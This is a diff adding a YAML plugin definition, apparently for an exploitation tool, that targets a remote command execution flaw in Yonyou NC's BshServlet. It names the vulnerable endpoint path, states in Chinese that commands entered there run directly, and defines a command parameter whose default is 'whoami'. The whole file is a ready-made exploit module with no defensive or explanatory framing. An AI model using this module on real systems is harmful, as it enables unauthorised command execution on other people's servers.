@@ -1,0 +1,21 @@
+info:
+    app: 用友NC
+    name: BshServlet RCE
+    author: lz520520
+    plugin_version: 1.0.0
+    disclosure_date: "2021-06-01"
+    create_date: "2024-10-06 09:47:35"
+    update_date: "2024-10-06 09:47:35"
+    description: BshServlet RCE,参考泛微2019年漏洞
+    detail: |-
+        漏洞接口：/servlet/~ic/bsh.servlet.BshServlet
+        输入命令直接执行即可
+payloads:
+    - name: cmd1
+      alias: 命令执行
+      params:
+          - key: cmd
+            title: 命令
+            param_type: edit
+            default_value: whoami
+            required: true
